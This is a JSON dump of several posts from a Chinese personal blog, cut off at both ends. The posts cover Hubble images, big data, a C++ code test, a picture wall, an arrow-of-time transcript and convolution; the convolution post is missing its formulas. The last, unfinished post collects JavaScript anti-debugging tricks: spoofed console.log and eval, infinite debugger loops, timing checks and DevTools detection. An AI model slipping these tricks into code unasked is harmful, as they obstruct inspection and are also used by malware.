站台这里是下一站的站台，来场星际旅行吧~。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"哈勃望远镜在你生日那天看到了啥","slug":"pen/哈勃望远镜在你生日那天看到了啥","date":"2020-05-04T08:50:43.000Z","updated":"2020-05-04T08:50:43.000Z","comments":true,"path":"p/6af346a8/","permalink":"https://blog.mhuig.top/p/6af346a8/","excerpt":"","text":"About1990 年，NASA 将哈勃望远镜送进太空。多年来哈勃望远镜一直在探索宇宙，拍摄了许多珍贵的图像。 2020 年是哈勃望远镜服役的第 30 年，为此 NASA 公开了哈勃望远镜拍摄的 366 张珍贵图像。 哈勃望远镜每周 7 天，每天 24 小时不间断地探索宇宙。 这意味着它在一年中的每一天都观察到了一些迷人的宇宙奇观。 What did Hubble look at on your birthday? 可以在 NASA 网站 中输入月份和日期来查找。 What Did Hubble See on Your Birthday?大图警告 点击查看","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"大数据技术概述","slug":"bigdata/大数据技术概述","date":"2020-05-01T00:02:39.000Z","updated":"2020-05-01T00:02:39.000Z","comments":true,"path":"p/376025fe/","permalink":"https://blog.mhuig.top/p/376025fe/","excerpt":"","text":"大数据时代 第三次信息化浪潮根据 IBM 前首席执行官郭士纳的观点，IT 领域每隔十五年就会迎来一次重大变革 信息化浪潮 发生时间 标志 解决问题 代表企业 第一次浪潮 1980 年前后 个人计算机 信息处理 Intel、AMD、IBM、苹果、微软、联想、戴尔、惠普等 第二次浪潮 1995 年前后 互联网 信息传输 雅虎、谷歌、阿里巴巴、百度、腾讯等 第三次浪潮 2010 年前后 物联网、云计算和大数据 信息爆炸 将涌现出一批新的市场标杆企业 信息科技为大数据时代提供技术支撑 存储设备容量不断增加 CPU 处理能力大幅提升 网络带宽不断增加 数据产生方式的变革促成大数据时代的来临 大数据的特征及数据科学面临的挑战 大数据概念 数据量大 数据类型繁多 处理速度快 价值密度低 大数据的影响图灵奖获得者、著名数据库专家 Jim Gray 博士观察并总结人类自古以来，在科学研究上，先后历经了实验、理论、计算和数据四种范式 在思维方式方面，大数据完全颠覆了传统的思维方式： 全样而非抽样 效率而非精确 相关而非因果 大数据关键技术 技术层面 功能 数据采集 利用 ETL 工具将分布的、异构数据源中的数据如关系数据、平面数据文件等，抽取到临时中间层后进行清洗、转换、集成，最后加载到数据仓库或数据集市中，成为联机分析处理、数据挖掘的基础；或者也可以把实时采集的数据作为流计算系统的输入，进行实时处理分析 数据存储和管理 利用分布式文件系统、数据仓库、关系数据库、NoSQL 数据库、云数据库等，实现对结构化、半结构化和非结构化海量数据的存储和管理 数据处理与分析 利用分布式并行编程模型和计算框架，结合机器学习和数据挖掘算法，实现对海量数据的处理和分析；对分析结果进行可视化呈现，帮助人们更好地理解数据、分析数据 数据隐私和安全 在从大数据中挖掘潜在的巨大商业价值和学术价值的同时，构建隐私数据保护体系和数据安全体系，有效保护个人隐私和数据安全 两大核心技术 大数据计算模式 代表性大数据技术Hadoop Hadoop—MapReduce MapReduce 将复杂的、运行于大规模集群上的并行计算过程高度地抽象到了两个函数：Map 和 Reduce 编程容易，不需要掌握分布式并行编程细节，也可以很容易把自己的程序运行在分布式系统上，完成海量数据的计算 MapReduce 采用 “分而治之” 策略，一个存储在分布式文件系统中的大规模数据集，会被切分成许多独立的分片（split），这些分片可以被多个 Map 任务并行处理 Hadoop—YARNYARN 的目标就是实现 “一个集群多个框架”，为什么？ 一个企业当中同时存在各种不同的业务应用场景，需要采用不同的计算框架 MapReduce 实现离线批处理 使用 Impala 实现实时交互式查询分析 使用 Storm 实现流式数据实时分析 使用 Spark 实现迭代计算 这些产品通常来自不同的开发团队，具有各自的资源调度管理机制为了避免不同类型应用之间互相干扰，企业就需要把内部的服务器拆分成多个集群，分别安装运行不同的计算框架，即 “一个框架一个集群” 导致问题 集群资源利用率低 数据无法共享 维护代价高 YARN 的目标就是实现 “一个集群多个框架”，即在一个集群上部署一个统一的资源调度管理框架 YARN，在 YARN 之上可以部署其他各种计算框架由 YARN 为这些计算框架提供统一的资源调度管理服务，并且能够根据各种计算框架的负载需求，调整各自占用的资源，实现集群资源共享和资源弹性收缩可以实现一个集群上的不同应用负载混搭，有效提高了集群的利用率不同计算框架可以共享底层存储，避免了数据集跨集群移动 Spark Flink Beam","categories":[{"name":"BigData","slug":"BigData","permalink":"https://blog.mhuig.top/categories/BigData/"}],"tags":[{"name":"BigData","slug":"BigData","permalink":"https://blog.mhuig.top/tags/BigData/"}]},{"title":"Mac Code Test","slug":"Test/macCodeTest","date":"2020-04-30T06:06:43.000Z","updated":"2020-04-30T06:06:43.000Z","comments":true,"path":"p/91953e39/","permalink":"https://blog.mhuig.top/p/91953e39/","excerpt":"","text":"本项测试可能已失效 代码块全屏测试 How To Use? 导入库文件即可&lt;link rel='stylesheet' href='https://cdn.jsdelivr.net/gh/MHuiG/blog-cdn@1.1.12/css/me.css'&gt;&lt;script src='https://cdn.jsdelivr.net/gh/MHuiG/blog-cdn@1.1.12/js/me.js'&gt;&lt;/script&gt; cpp code#include &lt;iostream&gt;using namespace std; int main() { cout &lt;&lt; \"Hello, World!\"; return 0;} python code#!/usr/bin/pythonprint (\"Hello, Python!\") code#include &lt;cstdio&gt;#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;const int SIZE = 5e6 + 1;struct edge{ int to_node, id; edge(int t, int i): to_node(t), id(i) {} ~edge() = default;};vector&lt;int&gt; edges[SIZE];vector&lt;edge&gt; querys[SIZE];int father[SIZE], mark[SIZE], ans[SIZE];int n, m, s;int getfa(int x){ if (father[x] == x) return x; else return father[x] = getfa(father[x]);}void tarjan(int x){ mark[x] = 1; for (auto i = edges[x].begin(); i != edges[x].end(); i++) { if (mark[*i]) continue; tarjan(*i); father[*i] = x; } for (auto i = querys[x].begin(); i != querys[x].end(); i++) { int y = (*i).to_node, id = (*i).id; if (mark[y] == 2) ans[id] = getfa(y); } mark[x] = 2;}int main(){ int u, v; scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;s); for (int i = 1; i &lt;= n; i++) { father[i] = i; mark[i] = 0; } for (int i = 1; i &lt; n; i++) { scanf(\"%d%d\", &amp;u, &amp;v); edges[u].emplace_back(v); edges[v].emplace_back(u); } int x, y; for (int i = 1; i &lt;= m; i++) { scanf(\"%d%d\", &amp;x, &amp;y); if (x == y) ans[i] = 0; else { querys[x].emplace_back(edge(y, i)); querys[y].emplace_back(edge(x, i)); } } tarjan(s); for (int i = 1; i &lt;= m; i++) printf(\"%d\\n\", ans[i]); return 0;}","categories":[{"name":"实验性","slug":"实验性","permalink":"https://blog.mhuig.top/categories/%E5%AE%9E%E9%AA%8C%E6%80%A7/"}],"tags":[{"name":"实验性","slug":"实验性","permalink":"https://blog.mhuig.top/tags/%E5%AE%9E%E9%AA%8C%E6%80%A7/"}]},{"title":"图片墙","slug":"Test/图片墙","date":"2020-04-28T04:05:43.000Z","updated":"2020-04-28T04:05:43.000Z","comments":false,"path":"p/e9fadccb/","permalink":"https://blog.mhuig.top/p/e9fadccb/","excerpt":"","text":"* { margin: 0; padding: 0;} .list { width: 100%; margin: 0 auto; overflow: hidden; zoom: 1;} .list .ul { float: left; width: calc((100% - 100px)/4); margin: 0 10px;} .list .li { margin-bottom: 20px;} .list img { width: 100%; border-radius: 5px; vertical-align: top;} function URL(d){ d+=new Date().getTime() var s = \"https://picsum.photos/seed/\"+d+\"/200/300\" return s } var i=0; function WriteHtml(){ document.getElementsByClassName('list')[0].innerHTML+=` ` } WriteHtml(); WriteHtml(); WriteHtml(); WriteHtml(); function getScrollTop() { var scrollPos; if (window.pageYOffset) { scrollPos = window.pageYOffset; } else if (document.compatMode && document.compatMode != 'BackCompat') { scrollPos = document.documentElement.scrollTop; } else if (document.body) { scrollPos = document.body.scrollTop; } return scrollPos; } function WriteHtmlListener(){ var scrollTop = getScrollTop(); var scrollHeight = document.documentElement.scrollHeight var windowHeight = window.innerHeight; if(scrollTop + windowHeight > scrollHeight - 2000){ WriteHtml() } } window.addEventListener(\"scroll\",WriteHtmlListener,false) volantis.EventListener.list.push(new volantisEventListener(\"scroll\",WriteHtmlListener,window)) // $(window).scroll(function(){ // var scrollTop = $(this).scrollTop(); // var scrollHeight = $(document).height(); // var windowHeight = $(this).height(); // if(scrollTop + windowHeight > scrollHeight - 2000){ // WriteHtml() // } // });","categories":[{"name":"实验性","slug":"实验性","permalink":"https://blog.mhuig.top/categories/%E5%AE%9E%E9%AA%8C%E6%80%A7/"}],"tags":[{"name":"实验性","slug":"实验性","permalink":"https://blog.mhuig.top/tags/%E5%AE%9E%E9%AA%8C%E6%80%A7/"}]},{"title":"时间之箭","slug":"pen/时间之箭","date":"2020-04-22T01:42:43.000Z","updated":"2020-04-22T01:42:43.000Z","comments":true,"path":"p/564714f9/","permalink":"https://blog.mhuig.top/p/564714f9/","excerpt":"时间就像一只箭，射向未知的前方，把过去永远留在后面。Time is like an arrow, shooting towards the unknown, leaving the past behind forever.","text":"时间就像一只箭，射向未知的前方，把过去永远留在后面。Time is like an arrow, shooting towards the unknown, leaving the past behind forever. 每个人 你所热爱的一切Every piece of everyone, of everything you love, 你所憎恨的一切 of everything you hate, 你所拥有的最宝贵的东西 of everything you hold most precious, 在宇宙生命中最为伊始的几分钟内 was assembled by the forces of nature 由自然的力量合成 in the first few minutes of the universe, 在恒星的中心转化 transformed in the hearts of starts 或者在它们燃烧的消亡中诞生 or created in their fiery deaths 而当你去世的时候 And when you die, 这些碎片将回到宇宙中 those pieces will be returned to the universe 进入无限的死亡又重生的轮回之中 in the endless cycle of death and rebirth. 太阳的命运也是所有恒星的命运 The fate of the sun is the same as for all starts. 终有一天 &nbsp; 他们都会消亡 One day, they must all eventually die 宇宙将会陷入永无止境的黑暗之中 and the cosmos will be plunged into eternal night. 这便是时间箭头最深远的影响 And this is the most profound consequence of the arrow of time. 我刚用相机捕捉到的 The light that I've just captured 这个光点二百五十万年前踏上了旅程 in my camera began its journey 2.5 million years ago. 那时地球上还没有人类 At that time, on Earth, there were no humans. 远古的祖先能人 Homo habilis, our distant ancestors, 正在非洲广袤的平原上漫步 wereroaming the plaints of Africa, 就是在那些光线 and as those light rays travelled 平行于无垠宇宙的同时 through the vastness of space. 人类不断进化 our species evolved,and thousands 一代又一代的生老病死 and thousands&nbsp;and thousands of qenerations of humans lived 周而复始 and died, 旅途开始的二百五十万年后 and then 2.5 million years after their journey began, 这些远道而来的信使 these messengers from the depths of space 穿越漫长的时间 and from way back in our past, 映入现在我们的眼帘 arrived here on Earth. 我们与那些遥远星系息息相关 we are in a very real sense connected to these qalaxies, 无论它们是如何与我们天各一方 no matter how far away they are across the universe, 那些经历过数十亿年旅行到达地球的光线 connected by the light 终究会把我们联系在一起 that's journeved billions of ears to reach us. “生星时代” The Stelliferous Era - 恒星漫天的时代 the age of the starts. 我们的太阳只是银河系两千亿颗恒星中的一颗 Our sun is just one of 200 billion starts in our qalaxy. 我们的星系也只是可观测的宇宙范围内的 Our qalaxy is one of 100 bllion 一百亿个星系中的一个 in the observable universe. 数不尽的星球上有数不胜数的岛屿 And countless islands of countless stars. 当我们注意太空的时候 When we look out into space, 我们也是在寻找自己的起源 we are looking into our own origins. 我们的故事就是宇宙的故事 Our story is the story of the universe. 因为我们是恒星真正的孩子 Beacuse we are truly children of the starts. 注入进我们的身体的 and written into every atom 每一个原子和分子 and every molecule of our bodies 就是宇宙从大爆炸 is the entire history of the universe 到现在全部的历史 from the Big Bang to the present day. 对我们来说 &nbsp; 像婚戒黄金一样的珍宝 It's quite a thought that something as 实际上也可以在一颗遥远的 &nbsp; 数百万光年 precious to us as the gold in a wedding ring was 甚至数十亿光年远的恒星上产生actually forged in the death of a distant star. 从宇宙起源到最后一个黑洞消失的这个过程中 as measured from its beainning to the evappration of the last black hole. 生命 正如我们所知life as we konw it, is only possible 只有百分之千亿分之for one thousandth of a billion&nbsp;billion&nbsp;billionth 千亿分之千分之一的可能性billion&nbsp;billion&nbsp;billionth&nbsp;billion&nbsp;billion&nbsp;billionth of a percent. 所以对于我来说 And that's why for me 宇宙中最迷人的奇迹不是恒星 the most astonishing wonder of the universe isn't a star 不是行星 &nbsp; 也不是星系 or a planet or a galaxy 甚至根本不是一个物质 It isn't a thing at all 而是时间里的一瞬间 It's an instant in time 那个瞬间 &nbsp; 就是现在 And that time is now. 当我们仰望天空 You see, when we look up into the sky, 望向遥远的恒星和星系时 at distant starts and galaxies, 我们其实是在仰望过去 then we're looking back in time 因为光从那些遥远天体到达地球需要时间 because the light takes time to journey from them to us. 而光从那个红点处传播到我们这里 And the light from that red dot has been travelling to us 差不多经历了整个宇宙史 for almost the entire history of the universe. 我们看到的是一百三十亿年前 You see, what we're looking at here is an event that happened 发生的事件 13 billion years ago. 我们看到的是宇宙初期的一颗恒星 What we're looking at here is the explosive death 爆炸灭亡的景象 of one of the first starts in the universe. 一日为二十四个小时 A day on Earth is the 24 hours 即地球绕轴自转一周 it takes our planet to rotate once on its axis. 一月为二十九天半 Our months are based on the 29-and-a-half days 即月亮在夜空完成盈亏圆缺 it takes the moon to wax and wane in the night sky. 一年为三百六十五天又四分之一天 And a year is the 365-and-a-quarter days 即地球绕太阳公转一周 it takes us to orbit&nbsp;once around the sun. 人类的生命便消逝在这些熟悉的时间量程之内 These familiar timescales mark the passing of our lives. 这是宇宙无法避免的真相 It's an inescapable fact of the universe, 也被写入了物理学基本定律 written into the fundamental laws of physics, 整个宇宙将消亡 The entire cosmos will die, 银河系中的两千亿恒星将全部消亡 Every single one of the 200 billion starts in our galaxy will go out. 如同太阳末日 &nbsp; 便是地球末日 And just as the death of the sun means the end of life on our planet, 每一颗恒星的灭亡 so the death of every star 都可能预示着宇宙中其他某种生命的灭亡 will extinguish any possibility of life in the universe. 永恒的变化是人类生命中最基本的部分 Permanent change is a fundamental part of what it means to be human. 随着时间流逝 &nbsp; 我们都会变老We all age as the years pass by. 人们出生 &nbsp; 成长 &nbsp; 死亡People are born, they live, they die. 我想这只是生命中悲悲喜喜的一部分I suppose it's part of the joy and tragedy of our lives. 但纵观宇宙But out there in the universe, 那些宏伟的如史诗般的循环好像永恒不变those grand and epic cycles appear eternal and unchanging. 然而这只是错觉But that's an illlusion. 宇宙长河就如同我们的生命一样You see, in the life of the universe, just in our lives, 一切都在不可逆转地变化everything is irreversibly changing. 我们从没见过浪花离开过湖面We never see waves travelling across lakes. 聚集在一起 &nbsp; 组成巨大的冰块重回冰川coming together and bouncing chunks of ice back onto glaciers. 我们被迫前往将来We are compelled to travel into the future. 那是因为And that's because 时间箭头规定 &nbsp; 随着时间流逝the arrow of time dictates that as each moment passes, 万物也在发生变化things change. 变化一旦发生 &nbsp; 就无法更改And once these changes have happend, they are never undone. 这些循环看似永恒不变These cycles seem eternal and unchanging, 但随着时间之书徐徐展开but as the story of time unfolds, 一条真理跃然眼前afundamental truth is revealed. 没有什么能够永恒Nothing lates forever.","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Time","slug":"随笔/Time","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/Time/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"Time","slug":"Time","permalink":"https://blog.mhuig.top/tags/Time/"}]},{"title":"Hello World","slug":"pen/Hello World","date":"2020-04-19T06:24:29.000Z","updated":"2020-04-19T06:24:29.000Z","comments":true,"path":"p/4a17b156/","permalink":"https://blog.mhuig.top/p/4a17b156/","excerpt":"你好，世界！","text":"你好，世界！ 全新的主题，熟悉的代码，怎能不再次心动？ 这是 MHuiG 的又一个博客！ 原博客数据不再迁移此处，将其作为该博客的子站我的 NoteBook:&nbsp;https://mhuig.github.io/NoteBook/ 后注: 原博客数据已迁移此处 【NoteBook 已闭源】","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"},{"name":"Hello","slug":"随笔/Hello","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/Hello/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"Hello","slug":"Hello","permalink":"https://blog.mhuig.top/tags/Hello/"}]},{"title":"理解卷积","slug":"ml/理解卷积","date":"2020-03-09T12:05:42.000Z","updated":"2020-03-09T12:05:42.000Z","comments":true,"path":"p/xa6297acc/","permalink":"https://blog.mhuig.top/p/xa6297acc/","excerpt":"本文的目的是深入的理解卷积, 通过一些示例, 卷积将会成为一个非常简单的想法.","text":"本文的目的是深入的理解卷积, 通过一些示例, 卷积将会成为一个非常简单的想法. 抛球的经验想象一下，我们将一个球从某个高度掉落到地面上，球在该地面只能在一个方向上运动, 如果您将球放下然后从其着陆点上方再次放下, 球可能会前进的距离是多少? 让我们分解一下。在第一次下落之后，它将以概率降落距起点个单位，其中是概率分布。 现在，在第一次下落之后，我们将球捡起并从其首次着陆点上方的另一个高度下落。球从新起点滚动单位的概率为,其中如果从不同高度掉落，则可能是不同的概率分布。 如果我们确定了第一个的结果，我们就知道了球的移动距离，对于球的总距离为，第二个球的移动距离也固定为，其中 。因此发生这种情况的可能性就是 。 让我们考虑一个具体的离散示例。 我们希望总距离为。如果它第一次滚动 ，则第二次它必须滚动 ,才能达到我们的总距离 。&nbsp;这个概率是 。 但是，这不是我们达到的总距离的唯一方法。球第一次可以滚动个单位，第二次可以滚动个单位。 或第一次为，第二次为。 只要将和加和等于，它就可以取任意值。 这个概率分别是 和 。 为了找出球到达总距离的总可能性，我们不能仅考虑一种到达的可能方式。 相反，我们考虑将划分为两个球和的所有可能方法，并对每种方法的概率求和。 我们已经知道，对于每种情况， 的概率就是 。 因此，对 的每个解求和，我们可以将总似然表示为： 事实证明，我们正在做卷积! 特别地，定义在处的和的卷积定义为： 如果我们用 代替，我们得到： 这是卷积的标准定义。 为了更具体一点，我们可以考虑球可能着陆的位置。 在第一次下降之后，它将以概率降落在中间位置。 如果它降落在处，则它有概率 降落在位置处。 为了得到卷积，我们考虑所有中间位置。 可视化卷积有一个很好的技巧，可以帮助人们更轻松地思考卷积。 首先，观察。 假设一个球从其起点降落一定距离的概率为。 然后，此后，它从着陆点开始的距离为的概率为 。 如果我们知道球在第二次下降后落在位置上，那么前一个位置是的概率是多少？ 因此，先前位置为的概率为 。 现在，考虑每个中间位置有助于球最终降落在的概率。 我们知道第一滴将球放到中间位置的概率是。 我们还知道，如果它降落在上，它进入的概率为 。 对所有求和，我们得到了卷积。 这种方法的优点是，它使我们可以在单个图片中可视化卷积在值处的评估。 通过移动下半部分，我们可以评估其他值的卷积。 这使我们能够从整体上理解卷积。 例如，我们可以看到分布对齐时达到峰值。 且随着分布之间的交点变小而缩小。 过在动画中使用此技巧，实际上可以从视觉上理解卷积。 下面，我们可以看到两个框函数的卷积： 有了这种观点，很多事情就会变得更加直观。 让我们考虑一个非概率示例。 卷积有时在音频处理中使用。 例如，一个函数可能会使用其中有两个尖峰但在其他所有地方为零的函数来创建回波。 当我们的双尖峰功能滑动时，一个尖峰首先击中一个时间点，将该信号添加到输出声音中，然后又出现另一个尖峰，并添加第二个延迟副本。 高维卷积卷积是一个非常笼统的想法。我们还可以将它们用于更大的尺寸。 让我们再次考虑一个落球的例子。现在，随着位置的下降，它的位置不仅在一维，而在二维。 卷积与以前相同： 但是，现在，和是向量。更明确地说， 或在标准定义中： 就像一维卷积一样，我们可以将二维卷积视为将一个函数滑动到另一个函数之上，相乘和相加。 一种常见的应用是图像处理。我们可以将图像视为二维函数。许多重要的图像转换都是卷积，您可以在其中将图像函数与一个非常小的局部函数（称为 “卷积核”）进行卷积。 卷积核滑动到图像的每个位置，并计算一个新像素作为其浮动像素的加权和。 例如，通过平均 3x3 像素矩阵，我们可以使图像模糊。 为此，我们的内核在框中的每个像素上取值， 我们还可以通过在两个相邻像素上取值和，在其他所有位置取零来检测边缘。 也就是说，我们减去两个相邻像素。 当并排像素相似时，这大约等于零。 然而，在边缘上，相邻像素在垂直于边缘的方向上有很大不同。 卷积神经网络那么，卷积与卷积神经网络有何关系？ 考虑一个具有输入和输出的一维卷积层，就像这样： 正如我们观察到的，我们可以用输入来描述输出： 通常，A 将是多个神经元。 但是假设它只是一个神经元。 回想一下，神经网络中的典型神经元描述为： 其中，是输入。 权重，描述了神经元如何连接到其输入。&nbsp;负权重表示输入抑制神经元的激活，而正权重则鼓励神经元激活。 权重是神经元的心脏，控制神经元的行为。说多个神经元是相同的，这与说权重相同是一回事。 卷积将为我们处理的是神经元的这种连线，描述了所有权重以及哪些权重相同。 通常，我们一次而不是单独描述一个层中的所有神经元。 诀窍是要有一个权重矩阵： 例如，我们得到： 矩阵的每一行都描述了将神经元连接到其输入的权重。 但是，返回到卷积层，因为同一神经元有多个副本，所以许多权重出现在多个位置。 对应于等式： 因此，通常，权重矩阵会将每个输入连接到具有不同权重的每个神经元： 像上面的卷积层的矩阵看起来很不一样。 相同的权重出现在多个位置中。 而且由于神经元没有连接到许多可能的输入，因此存在很多零。 与上述矩阵相乘与与，，卷积相同。 滑动到不同位置的功能对应于在那些位置具有神经元。 二维卷积层呢？ 二维卷积层的布线对应于二维卷积。 考虑上面的示例，通过使用卷积来检测图像边缘，方法是在周围滑动一个内核并将其应用于每个面片。 就像这样，卷积层会将神经元应用于图像的每个 patch。 结论我们在此博客文章中介绍了许多数学机制，但是获得的结果可能并不明显。 卷积显然是概率论和计算机图形学中的有用工具，但是从卷积的角度说卷积神经网络有什么好处呢？ 第一个优点是我们拥有一些非常强大的语言来描述网络的布线。 到目前为止，我们所处理的示例还不够复杂，以至于无法清楚地看到这种好处，但是通过卷积可以使我们摆脱大量令人不快的簿记工作。 其次，卷积具有明显的实施优势。 许多库提供高效的卷积例程。 此外，尽管卷积天真地看起来是运算，但使用一些相当深的数学见解，就有可能创建实现。 我们将在以后的文章中对此进行更详细的讨论。 实际上，在 GPU 上使用高效并行卷积实现对于计算机视觉的最新进展至关重要。 参考文献[English] Understanding Convolutions","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"},{"name":"概率","slug":"Math/概率","permalink":"https://blog.mhuig.top/categories/Math/%E6%A6%82%E7%8E%87/"}],"tags":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"},{"name":"概率","slug":"概率","permalink":"https://blog.mhuig.top/tags/%E6%A6%82%E7%8E%87/"},{"name":"神经网络","slug":"神经网络","permalink":"https://blog.mhuig.top/tags/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"}]},{"title":"JavaScript 反调试","slug":"web/JavaScript反调试","date":"2020-02-26T02:36:40.000Z","updated":"2020-02-26T02:36:40.000Z","comments":true,"path":"p/bfe2ff2a/","permalink":"https://blog.mhuig.top/p/bfe2ff2a/","excerpt":"总结一下关于 JavaScript 反调试技巧方面的内容。本文的目的是收集与 JavaScript 中的反调试有关的小窍门（其中一些已经被恶意软件或商业产品使用）。","text":"总结一下关于 JavaScript 反调试技巧方面的内容。本文的目的是收集与 JavaScript 中的反调试有关的小窍门（其中一些已经被恶意软件或商业产品使用）。 对于 JavaScript 来说，你只需要花一点时间进行调试和分析，你就能够了解到 JavaScript 代码段的功能逻辑。而我们所要讨论的内容，可以给那些想要分析你 JavaScript 代码的人增加一定的难度。不过我们的技术跟代码混淆无关，我们主要针对的是如何给代码主动调试增加困难。本文所要介绍的技术方法大致如下： 检测未知的执行环境（我们的代码只想在浏览器中被执行）； 检测调试工具（例如 DevTools）； 代码完整性控制； 流完整性控制； 反模拟； 简而言之，如果我们检测到了 “不正常” 的情况，程序的运行流程将会改变，并跳转到伪造的代码块，并 “隐藏” 真正的功能代码。 函数重定义这是一种最基本也是最常用的代码反调试技术了。在 JavaScript 中，我们可以对用于收集信息的函数进行重定义。比如说，console.log() 函数可以用来收集函数和变量等信息，并将其显示在控制台中。如果我们重新定义了这个函数，我们就可以修改它的行为，并隐藏特定信息或显示伪造的信息。我们可以直接在 DevTools 中运行这个函数来了解其功能： console.log(\"HelloWorld\");var fake = function() {};window['console']['log']= fake;console.log(\"Youcan't see me!\"); 运行后我们将会看到： VM127:1 HelloWorld 你会发现第二条信息并没有显示，因为我们重新定义了这个函数，即 “禁用” 了它原本的功能。但是我们也可以让它显示伪造的信息。比如说这样： console.log(\"Normalfunction\");//First we save a reference to the original console.log functionvar original = window['console']['log'];//Next we create our fake function//Basicly we check the argument and if match we call original function with otherparam.// If there is no match pass the argument to the original functionvar fake = function(argument) { if (argument === \"Ka0labs\") { original(\"Spoofed!\"); } else { original(argument); }}// We redefine now console.log as our fake functionwindow['console']['log']= fake;//Then we call console.log with any argumentconsole.log(\"Thisis unaltered\");//Now we should see other text in console different to \"Ka0labs\"console.log(\"Ka0labs\");//Aaaand everything still OKconsole.log(\"Byebye!\"); 如果一切正常的话： VM84:1 NormalfunctionVM84:11 Thisis unalteredVM84:9 Spoofed!VM84:11 Byebye! 实际上，为了控制代码的执行方式，我们还能够以更加聪明的方式来修改函数的功能。比如说，我们可以基于上述代码来构建一个代码段，并重定义 eval 函数。我们可以把 JavaScript 代码传递给 eval 函数，接下来代码将会被计算并执行。如果我们重定义了这个函数，我们就可以运行不同的代码了： //Just a normal evaleval(\"console.log('1337')\");//Now we repat the process...var original = eval;var fake = function(argument) { // If the code to be evaluated contains1337... if (argument.indexOf(\"1337\") !==-1) { // ... we just execute a different code original(\"for (i = 0; i &lt; 10;i++) { console.log(i);}\"); } else { original(argument); }}eval= fake;eval(\"console.log('Weshould see this...')\");//Now we should see the execution of a for loop instead of what is expectedeval(\"console.log('Too1337 for you!')\"); 运行结果如下： VM171:1 1337VM172:1 Weshould see this...VM173:1 0VM173:1 1VM173:1 2VM173:1 3VM173:1 4VM173:1 5VM173:1 6VM173:1 7VM173:1 8VM173:1 9 &nbsp; 通过这种方式修改程序流是一个很酷的技巧，但是正如我们在一开始所说的那样，它是最基本的技巧，很容易被发现并被击败。这是因为在 JavaScript 中，每个函数都有一个方法 toString（或 Firefox 中的 toSource）返回其自己的代码。因此，仅需要检查所需函数的代码是否已更改。当然，我们可以重新定义方法 toString / toSource，但是我们陷入了同样的情况：function.toString.toString() 。 断点为了帮助我们了解代码的功能，JavaScript 调试工具（例如 DevTools）都可以通过设置断点的方式阻止脚本代码执行，而断点也是代码调试中最基本的了。如果你研究过调试器或者 x86 架构，你可能会比较熟悉 0xCC 指令。在 JavaScript 中，我们有一个名叫 debugger 的类似指令。当我们在代码中声明了 debugger 函数后，脚本代码将会在 debugger 指令这里停止运行。比如说： console.log(\"Seeme!\");debugger;console.log(\"Seeme!\"); 很多商业产品会在代码中定义一个无限循环的 debugger 指令，不过某些浏览器会屏蔽这种代码，而有些则不会。这种方法的主要目的就是让那些想要调试你代码的人感到厌烦，因为无限循环意味着代码会不断地弹出窗口来询问你是否要继续运行脚本代码： setTimeout(function(){while (true) {eval(\"debugger\")}}) setInterval(function()&nbsp;{var&nbsp;a =&nbsp;new&nbsp;Date();&nbsp;debugger;&nbsp;return&nbsp;new&nbsp;Date() - a &gt;&nbsp;100;}, 100); 时间差异这是一种从传统反逆向技术那里借鉴过来的基于时间的反调试技巧。当脚本在 DevTools 等工具环境下执行时，运行速度会非常慢（时间久），所以我们就可以根据运行时间来判断脚本当前是否正在被调试。比如说，我们可以通过测量代码中两个设置点之间的运行时间，然后用这个值作为参考，如果运行时间超过这个值，说明脚本当前在调试器中运行。演示代码如下： setInterval(function(){ var startTime = performance.now(), check,diff; for (check = 0; check &lt; 1000; check++){ console.log(check); console.clear(); } diff = performance.now() - startTime; if (diff &gt; 200){ alert(\"Debugger detected!\"); }},500); DevTools 检测（I）[Chrome]：getter这项技术利用的是 div 元素中的 id 属性，当 div 元素被发送至控制台（例如 console.log(div) ）时，浏览器会自动尝试获取其中的元素 id。如果代码在调用了 console.log 之后又调用了 getter 方法，说明控制台当前正在运行。简单的概念验证代码如下： let div = document.createElement('div');let loop = setInterval(() =&gt; { console.log(div); console.clear();});Object.defineProperty(div,\"id\", {get: () =&gt; { clearInterval(loop); alert(\"Dev Tools detected!\");}}); DevTools 检测（II）[Chrome]：大小更改如果打开了 DevTools（除非将其取消对接打开），则 window.outerWidth / Height 和 window.innerWidth / Height 之间的差异将发生变化，因此可以循环检测。Devtools-detect 使用此技巧： const widthThreshold = window.outerWidth - window.innerWidth &gt; threshold;const heightThreshold = window.outerHeight - window.innerHeight &gt; threshold;const orientation = widthThreshold ? 'vertical' : 'horizontal'; 隐式流完整性控制当我们尝试对 JavaScript 代码段进行模糊处理时，第一步就是开始重命名一些变量和函数，以阐明源代码。您只需将代码拆分为较小的代码块，然后开始在此处和此处重命名。在 JavaScript 中，我们可以检查函数名称是否已更改或保持相同的名称。或更准确地说，我们可以检查堆栈跟踪是否包含原始名称和原始顺序。使用 arguments.callee.caller，我们可以创建堆栈跟踪，以保存先前执行的函数。我们可以使用此信息来生成一个哈希，该哈希将成为用于生成用于解密 JavaScript 其他部分的密钥的种子。这样，我们就可以对流的完整性进行隐式控制，因为如果重命名功能或要执行的功能顺序稍有不同，则创建的哈希将完全不同。如果哈希不同，则生成的密钥也将不同。如果密钥不同，则无法解密代码。为了更好地理解它，请参见下一个示例： function getCallStack() { var 